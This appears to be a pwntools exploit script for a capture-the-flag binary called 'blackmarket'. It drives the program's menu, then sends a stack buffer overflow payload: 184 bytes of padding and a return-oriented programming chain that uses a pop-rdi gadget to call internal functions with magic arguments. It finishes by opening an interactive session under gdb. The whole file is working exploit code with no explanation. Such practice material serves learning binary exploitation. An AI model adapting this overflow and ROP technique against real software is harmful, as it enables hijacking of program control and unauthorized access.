from pwn import *

def exploit():
    #p = remote("127.0.0.1", 8888)
    p = process("blackmarket")
    p.sendline("0")
    p.sendline("yes")
    for i in range(5):
        p.sendline("9")
    padding = 184
    bindebg = p64(0x000000000040174c)
    message = p64(0x0000000000401822)
    shaccss = p64(0x0000000000401766)
    success_msg = p64(0x000000000040188b)
    debug_mode = p64(0x00000000004018e0)
    poprdi = p64(0x0000000000401f23)
    payload = "A" * padding
    payload += poprdi
    payload += p64(0xDEADBAAD)
    payload += bindebg
    payload += poprdi
    payload += p64(0x155C1F / 0x539)
    payload += message
    payload += poprdi
    payload += p64(0xDEADFABE)
    payload += shaccss
    payload += poprdi
    payload += p64(0x1)
    payload += success_msg
    payload += debug_mode

    '''
    payload = ""
    payload += "A" * padding
    payload += p64(poprdi)
    payload += p64(0xDEADBAAD)
    payload += p64(bindebg)
    payload += p64(poprdi)
    payload += p64(0xDEADFABE)
    payload += p64(shaccss)
    payload += p64(poprdi)
    payload += p64(0x155C1F/0x539)
    payload += p64(message)
    payload += p64(success_msg)
    payload += p64(debug_mode)
    '''

    gdb.attach(p, '''
                b *main+1280
                c                
                ''')

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
